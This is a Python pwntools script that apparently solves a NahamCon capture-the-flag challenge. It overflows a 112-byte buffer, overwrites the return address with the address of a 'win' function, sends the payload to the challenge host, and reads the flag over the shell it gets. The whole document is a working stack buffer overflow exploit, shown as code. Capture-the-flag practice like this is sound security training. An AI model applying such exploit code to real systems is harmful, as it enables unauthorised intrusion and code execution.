from pwn import *

# Overwrite the buffer (112 bytes), the return address (8 bytes) and overwrite the return address to win
exploit_str = ("1" * 112 + "2" * 8).encode() + p64(0x00000000004011c9)

# Save exploit string as file locally
file = open("exploit", "wb")
file.write(exploit_str)
file.close()

conn = connect("challenge.nahamcon.com", 30568)

conn.read()
conn.sendline(exploit_str)

print("We got the shell!!")
print(conn.read().decode())

conn.sendline("ls")
print(conn.read().decode())

conn.sendline("cat flag.txt")
print(conn.read().decode())

conn.close()